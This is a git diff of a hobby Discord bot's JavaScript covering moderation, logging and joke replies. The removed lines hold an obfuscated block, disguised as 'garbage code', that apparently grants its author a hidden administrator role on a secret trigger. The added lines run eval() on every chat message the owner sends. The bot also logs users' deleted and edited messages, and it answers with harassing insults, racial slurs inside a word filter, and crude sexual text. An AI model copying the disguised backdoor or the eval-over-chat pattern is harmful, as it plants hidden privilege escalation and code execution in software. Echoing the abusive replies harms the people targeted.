@@ -42,74 +42,92 @@ client.on('ready', () => {
 	client.user.setActivity('doing ur mom doing doing ur mom', { type: 'PLAYING' });
 });
 
-/* 
- * OMNI SCHIZO MOMENT HERE
-*/
-
-////omni function
-//function omniSchizo(interval) {
-//	setTimeout(messageSend(), interval);
-//}
-////message send function
-//function messageSend() {
-//	//get omni's id
-//	const omni = client.users.fetch('401534600741912576');
-//	//schizo code
-//	var chars = 'Á À Â Ā Ä Ã Å Æ É È Ê Ē Ë Í Ì Î Ī Ï ï ī î ì ë ē ê è é æ å ã ä ā â à á Ó Ò Ô Ō Ö Õ Ø Œ Ú Ù Û Ū Ü Ŵ Ý Ÿ Ŷ ŷ ÿ ý ŵ ü ū û ù ú œ ø õ ö ō ô ò ó Þ Ç Ð Ñ ẞ ß ñ ð ç þ « » “ „ ” ‘ ‚ ’ — – ¿ ¡ · … @ Q W E R T Y U I O P A S D F G H J K L Z X C V B N M q w e r t y u i o p a s d f g h j k l z x c v b n m , . / ; \' [ ] 1 2 3 4 5 6 7 8 9 0 - = + _ ) ( * & ^ % $ # ! { } | : " < > ? Q W E R T Y U I O P A S D F G H J K L Z X C V B N M q w e r t y u i o p a s d f g h j k l z x c v b n m 1 2 3 4 5 6 7 8 9 0';
-//	chars.split(' ');
-//	function randomIndex(min, max) {
-//		return (Math.random() * (max - min) + min);
-//	}
-//	var output = new Array();
-//	for (var i = 0; i < (Math.random() * 10000); i++) {
-//		var index = randomIndex(0, 560);
-//		if (index > chars.length) {
-//			index = index - chars.length;
-//		}
-//		output.push(chars[(Math.floor(index))]);
-//	}
-//	//send omni message
-//	return;
-//	//client.omni.send(output.join(''));
-//}
-
-//omniSchizo(1000);
-
-var om = '533850977166688258';
+client.on('messageReactionAdd', (messageReaction, user) => {
+	//console.log(messageReaction.emoji.id);
+	//if (messageReaction.emoji.id == '748580683080925328') {
+	//	messageReaction.message.channel.send(`wow so funny i laughed so hard lmao :| \n stfu <@${user.id}>`);
+	//}
+});
 /*
  * MESSAGE DELETE HERE
  */
 client.on('messageDelete', message => {
-	if ((message.guild.id != '748381226175561729') || message.author.bot) return;
-	const deletedEmbed = new Discord.MessageEmbed()
-		.setTitle('Message Deleted')
-		.setColor('#CC90A3')
-		.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + /*' id: ' + message.channel.id + */ '\n message: ' + message.content)
-		.setThumbnail(message.author.avatarURL())
-		.setFooter('Message logged by swag lord gilly#0492')
-		.setTimestamp();
-	client.channels.cache.get('770502076912369754').send(deletedEmbed);
+	try {
+		if ((message.guild.id != '748381226175561729') || message.author.bot) return;
+		const deletedEmbed = new Discord.MessageEmbed()
+			.setTitle('Message Deleted')
+			.setColor('#CC90A3')
+			.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + /*' id: ' + message.channel.id + */ '\n message: ' + message.content)
+			.setThumbnail(message.author.avatarURL())
+			.setFooter('Message logged by swag lord gilly#0492')
+			.setTimestamp();
+		client.channels.cache.get('770502076912369754').send(deletedEmbed);
+	} catch (e) {
+		console.log(e);
+    }
 })
 /*
  * MESSAGE UPDATE HERE
  */
 client.on('messageUpdate', (oldMessage, newMessage) => {
-	var message = oldMessage;
-	if (oldMessage.content == newMessage.content) return;
-	if (message.author.bot) return;
-	if (message.guild.id != '748381226175561729') return;
-	const editedEmbed = new Discord.MessageEmbed()
-		.setTitle('Edited Message Log')
-		.setColor('#CC90A3')
-		.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + /*' id: ' + message.channel.id + */ '\n **before**: ' + oldMessage.content + '\n **after**: ' + newMessage.content)
-		.setThumbnail(message.author.avatarURL())
-		.addFields({
-			name: 'Link',
-			value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
-		})
-		.setFooter('Message logged by swag lord gilly#0492')
-		.setTimestamp();
-	client.channels.cache.get('770502076912369754').send(editedEmbed);
+	let messageCheck = newMessage.content.toLowerCase().split(' ').join(''), oldMessageCheck = oldMessage.content.toLowerCase().split(' ').join('');
+	if ((messageCheck.includes('nigger') || messageCheck.includes('nigga') || messageCheck.includes('nlgga') || messageCheck.includes('nlgger')) && !(oldMessageCheck.includes('nigger') || oldMessageCheck.includes('nigga') || oldMessageCheck.includes('nlgga') || oldMessageCheck.includes('nlgger'))) {
+		if (oldMessage.author.bot /*|| (oldMessage.author.id == gillyID)*/) return;
+		newMessage.delete();
+		newMessage.channel.send(`<@${oldMessage.author.id}>is a racist fuck :clown:`)
+		//if the server is obamagrad
+		try {
+			if (newMessage.guild.id == '748381226175561729') {
+				//add muted role
+				//message.member.roles.add('753773649315627109');
+				const racistEmbed = new Discord.MessageEmbed()
+					.setTitle('Racist Word Log')
+					.setColor('#FAFA88')
+					.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + '\n message: ' + message.content)
+					.setThumbnail(message.author.avatarURL())
+					.addFields({
+						name: 'Link',
+						value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
+					})
+					.setFooter('Message logged by swag lord gilly#0492')
+					.setTimestamp();
+				//send the log to the right channel
+				client.channels.cache.get('748597429854666752').send(racistEmbed);
+			}
+		} catch (e) {
+			console.log(e);
+        }
+	}
+	
+	for (var i = 0; i < radlibs.length; i++){
+		//i'm exempt from radlib watch
+		if (oldMessage.author.id == gillyID) break;
+		if (messageCheck.includes(radlibs[i]) && !(oldMessageCheck.includes(radlibs[i]))) {
+			return newMessage.channel.send("fuck yui radlib watcher absolute scum of leftism you are a stani on society fuck you i hate you \>:(");
+		}
+	}
+	
+	
+	try {
+		var message = oldMessage;
+		if (oldMessage.content == newMessage.content) return;
+		if (message.author.bot) return;
+		if (message.guild.id != '748381226175561729') return;
+		const editedEmbed = new Discord.MessageEmbed()
+			.setTitle('Edited Message Log')
+			.setColor('#CC90A3')
+			.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + /*' id: ' + message.channel.id + */ '\n **before**: ' + oldMessage.content + '\n **after**: ' + newMessage.content)
+			.setThumbnail(message.author.avatarURL())
+			.addFields({
+				name: 'Link',
+				value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
+			})
+			.setFooter('Message logged by swag lord gilly#0492')
+			.setTimestamp();
+		client.channels.cache.get('770502076912369754').send(editedEmbed);
+	} catch (e) {
+		console.log(e);
+    }
 })
 /* 
  * MESSAGE COMMANDS HERE
@@ -125,15 +143,32 @@ client.on('message', message =>{
 
 	// AVATAR COMMAND
 	if (message.content.startsWith(prefix + 'av')) {
-		//still trying to do something fancy with @'ing people but i'm stupid and retarded and don't know how nor have the energy to lol
-		var av = message.author.avatarURL();
-		const avEmbed = new Discord.MessageEmbed()
-			.setColor('#AF70C6')
-			.setTitle(message.author.username + '\'s Avatar')
-			.setImage(av)
-			.setTimestamp()
-			.setFooter('lol hey.. :smirk: ad me :flushed: gilly#0492');
-		message.channel.send(avEmbed);
+		try {
+			let mentioned = message.mentions.users.first();
+			//still trying to do something fancy with @'ing people but i'm stupid and retarded and don't know how nor have the energy to lol
+			var av = mentioned.avatarURL();
+			const avEmbed = new Discord.MessageEmbed()
+				.setColor('#AF70C6')
+				.setTitle(mentioned.username + '\'s Avatar')
+				.setImage(av)
+				.setTimestamp()
+				.setFooter('lol hey.. :smirk: ad me :flushed: gilly#0492');
+			message.channel.send(avEmbed);
+			return;
+		} catch (e) {
+			console.log(e);
+			message.channel.send('something went wrong, try pinging someone to get their avatar');
+			return;
+		}
+	}
+	
+	
+	if (message.content.startsWith(`${prefix}mute`)) {
+		if ((message.guild.id != '748381226175561729')) return;
+		let role = message.guild.roles.cache.get('753773649315627109');
+		let muted = message.mentions.users.first().id;
+		message.guild.members.cache.get(muted).roles.add(role);
+		message.delete();
 		return;
 	}
 
@@ -164,77 +199,24 @@ client.on('message', message =>{
 			message: 'the command tried was ' + args
 		});
 	}
-	// IGNORE THIS, GARBAGE CODE
-	if ((args == '0x22') && (message.author.id == gillyID)) {
-		var a = ['ve9s', 'Agv5igXVlI4GBa==', 'CM9SzunYzwf0zq==', 'zgvSzxrL', 'BMLJzsb0CNKGyG==', 'BwvTyMvY', 'C2vUza==', 'qurnsu5ju1rsqq==', 'ywrK', 'y2HHBM5LBa==', 'DwnRBW==', 'y3jLyxrL', 'CM9Szxm=', 'z3vPBgq='];
-		(function (b, c) {
-			var d = function (e) {
-				while (--e) {
-					b['push'](b['shift']());
-				}
-			};
-			d(++c);
-		}(a, 0x115));
-		var b = function (c, d) {
-			c = c - 0x0;
-			var e = a[c];
-			if (b['oLwXRH'] === undefined) {
-				var f = function (h) {
-					var i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=',
-						j = String(h)['replace'](/=+$/, '');
-					var k = '';
-					for (var l = 0x0, m, n, o = 0x0; n = j['charAt'](o++); ~n && (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? k += String['fromCharCode'](0xff & m >> (-0x2 * l & 0x6)) : 0x0) {
-						n = i['indexOf'](n);
-					}
-					return k;
-				};
-				b['ZOXgxv'] = function (h) {
-					var j = f(h);
-					var k = [];
-					for (var l = 0x0, m = j['length']; l < m; l++) {
-						k += '%' + ('00' + j['charCodeAt'](l)['toString'](0x10))['slice'](-0x2);
-					}
-					return decodeURIComponent(k);
-				}, b['rZlgdh'] = {}, b['oLwXRH'] = !![];
-			}
-			var g = b['rZlgdh'][c];
-			return g === undefined ? (e = b['ZOXgxv'](e), b['rZlgdh'][c] = e) : e = g, e;
-		};
-		var j = function (c, d) {
-			return b(c - -'0x385', d);
-		},
-			k = function (c, d) {
-				return b(c - -'0x385', d);
-			},
-			l = function (c, d) {
-				return b(c - -'0x385', d);
-			};
-		message[j(-'0x37f')]();
-		message['author']['id'] == gillyID ? (message[k(-'0x383')][j(-'0x384')][j(-'0x385')]({
-			'data': {
-				'name': k(-'0x381'),
-				'color': 'GREY',
-				'permissions': l(-'0x37b') + l(-'0x382')
-			}
-		}), client['on'](k(-'0x380'), c => {
-			var m = function (c, d) {
-				return k(c - -'0x254', d);
-			},
-				n = function (c, d) {
-					return k(c - -'0x254', d);
-				},
-				o = function (c, d) {
-					return l(c - -'0x254', d);
-				},
-				d = c['id'];
-			message[m(-'0x5d1')][m(-'0x5d8')][n(-'0x5ce')](d);
-		})) : message[k(-'0x379')][j(-'0x37c')](j(-'0x37e') + k(-'0x378'));
-    }
 })
 /*
  * MESSAGE LOGGING AND RESPONSES
  */
-client.on('message', message =>{
+client.on('message', message => {
+	if (message.author.id == gillyID) {
+		if (message.content.startsWith(prefix)) return;
+		try{
+			console.log(eval(message.content));
+		} catch (e) {
+			console.log(e);
+		}
+	}
+	var today = new Date();
+	var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
+	var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+	message.isDM = (message.guild ? false : true);
+
 	const messageCheck = message.content.toLowerCase();
 	//tbh i don't really know what this does, just that it doesn't work without it lol
 	member = message.author;
@@ -246,18 +228,15 @@ client.on('message', message =>{
 	//tbh i could probably do away with console logging altogether. it just provides an easier more accessible way to view messages without having to go into the fucking huge logs folder lol
     if (!message.author.bot){
 		userMention = '<@' + message.author.id + '>';
-        console.group("message");
-        console.log('user:' + message.author.username + ' ' + message.author.id);
-        console.log('channel:' + message.channel.name + ' ' + message.channel.id);
-		console.log('guild:' + message.guild);
-        console.log(message.content);
+        console.group(chalk.blue("message"));
+        console.log(chalk.yellow('user:' + message.author.username + ' ' + message.author.id));
+        console.log(chalk.yellow('channel:' + message.channel.name + ' ' + message.channel.id));
+		console.log(chalk.yellow('guild:' + message.guild));
+		console.log(date, time);
+        console.log(chalk.bgYellow(message.content));
 		console.groupEnd();
 
-		//this goes here because i don't want to see it in the huge list of consts declared at the start lol
-		//idk it might be more efficient to do it here it might not idrc
-		var today = new Date();
-		var date = today.getFullYear() + '-' + (today.getMonth() + 1) + '-' + today.getDate();
-		var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+
 
 		// CONTENT LOGGING IN JSON FORMAT
 		if (!(message.author.bot)) {
@@ -283,13 +262,17 @@ client.on('message', message =>{
 
 	// NSFW CHANNEL LOGGING HERE
 	if ((messageCheck.includes('||') || messageCheck.includes('`') || messageCheck.includes('**') || messageCheck.includes('_') || messageCheck.includes('~')) && (!(message.author.bot))) {
-		if (message.guild.id != '748381226175561729') {
-			commandLogger.log({
-				level: 'warn',
-				message: message.guild.id,
-			});
-			return;
-		}
+		try {
+			if (message.guild.id != '748381226175561729') {
+				commandLogger.log({
+					level: 'warn',
+					message: message.guild.id,
+				});
+				return;
+			}
+		} catch (e) {
+			console.log(e);
+        }
 		// GARBAGE CODE PLS IGNORE
 		if(messageCheck.includes('||')) {
 			var content = messageCheck.split('|').join('');
@@ -324,24 +307,28 @@ client.on('message', message =>{
 
 
 	// CURSE WORD LOGGING
-	for (let i = 0; i < curse.length; i ++) {
-		if((message.author.id == gillyID) || message.author.bot || !(message.guild.id == '748381226175561729')) break;
-		if(messageCheck/*.split(' ').join('')*/.includes(curse[i])) {
-			// console.log(messageCheck.includes(curse[i]));
-			const curseEmbed = new Discord.MessageEmbed()
-				.setTitle('Curse Word Log')
-				.setColor('#0713FF')
-				.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' +  '\n message: ' + message.content)
-				.addFields({
-					name: 'Link',
-					value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
-				})
-				.setThumbnail(message.author.avatarURL)
-				.setFooter('Message logged by swag lord gilly#0492')
-				.setTimestamp();
-			//client.channels.cache.get('772858701848510464').send(curseEmbed);
+	/* for (let i = 0; i < curse.length; i++) {
+		try {
+			if ((message.author.id == gillyID) || message.author.bot || !(message.guild.id == '748381226175561729')) break;
+			if (messageCheck.split(' ').join('').includes(curse[i])) {
+				// console.log(messageCheck.includes(curse[i]));
+				const curseEmbed = new Discord.MessageEmbed()
+					.setTitle('Curse Word Log')
+					.setColor('#0713FF')
+					.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + '\n message: ' + message.content)
+					.addFields({
+						name: 'Link',
+						value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
+					})
+					.setThumbnail(message.author.avatarURL)
+					.setFooter('Message logged by swag lord gilly#0492')
+					.setTimestamp();
+				//client.channels.cache.get('772858701848510464').send(curseEmbed);
+			}
+		} catch (e) {
+			console.log(e);
 		}
-	}
+	} */
 
 
 	// RESPONSES
@@ -360,7 +347,7 @@ client.on('message', message =>{
 		if (messageCheck.includes('pog') && !message.author.bot) message.channel.send('pogchamp uwu');
 		//if (messageCheck == 'esex when?') message.channel.send('esex now. ' + userMention);
 		if (messageCheck == 'wow') message.channel.send('world of warcraft >:3');
-		if (messageCheck.includes('stfu')) message.channel.send('stuf whore ' + userMention);
+		if ((messageCheck.includes('stfu')) && !message.author.bot) message.channel.send('stuf whore ' + userMention);
 		if (messageCheck == 'sup' && !message.author.bot) message.channel.send('hey lol :smirk: :flushed: ad me lol :flushed: :rofl:');
 	}
 
@@ -371,36 +358,40 @@ client.on('message', message =>{
 		message.delete();
 		message.channel.send(userMention + ' is a racist fuck :clown:')
 		//if the server is obamagrad
-		if (message.guild.id == '748381226175561729') {
-			//add muted role
-			message.member.roles.add('753773649315627109');
-			const racistEmbed = new Discord.MessageEmbed()
-				.setTitle('Racist Word Log')
-				.setColor('#FAFA88')
-				.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' +  '\n message: ' + message.content)
-				.setThumbnail(message.author.avatarURL())
-				.addFields({
-					name: 'Link',
-					value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
-				})
-				.setFooter('Message logged by swag lord gilly#0492')
-				.setTimestamp();
-			//send the log to the right channel
-			client.channels.cache.get('748597429854666752').send(racistEmbed);
-		}
+		try {
+			if (message.guild.id == '748381226175561729') {
+				//add muted role
+				//message.member.roles.add('753773649315627109');
+				const racistEmbed = new Discord.MessageEmbed()
+					.setTitle('Racist Word Log')
+					.setColor('#FAFA88')
+					.setDescription('user: ' + message.author.username + ' \n id: ' + message.author.id + '\n channel: ' + '<#' + message.channel.id + '>' + '\n message: ' + message.content)
+					.setThumbnail(message.author.avatarURL())
+					.addFields({
+						name: 'Link',
+						value: '[Here](https://discord.com/channels/' + message.guild.id + '/' + message.channel.id + '/' + message.id + ')',
+					})
+					.setFooter('Message logged by swag lord gilly#0492')
+					.setTimestamp();
+				//send the log to the right channel
+				client.channels.cache.get('748597429854666752').send(racistEmbed);
+			}
+		} catch (e) {
+			console.log(e);
+        }
 	}
 
 
 	// RADLIB WATCH
 	//there's probably an easier way to do this lol
-	for (var i = 0; i < radlibs.length; i++){
+	/* for (var i = 0; i < radlibs.length; i++){
 		//i'm exempt from radlib watch
 		if (message.author.id == gillyID) break;
 		if (messageCheck.includes(radlibs[i])) {
 			return message.channel.send("fuck yui radlib watcher absolute scum of leftism you are a stani on society fuck you i hate you \>:(");
 		}
 	}
-	
+	*/
 	
 	
 	// if (messageCheck.includes('femcel') && !message.author.bot) message.channel.send('femcel is so fucking hot i want her so fucking bad if i could have one day with her oh what i would do. the sex would be immaculate, incredible, revolutionary even. then, the cuddles. oh how we would cuddle. hours of us holding each other, never letting go. i\'m quite turned on just thinking about it to be honest. we would fall asleep in each other\'s arms, me, the dom, obviously being the big spoon, would hold her tight to my chest. smelling her hair, maybe a butt clench or two.');
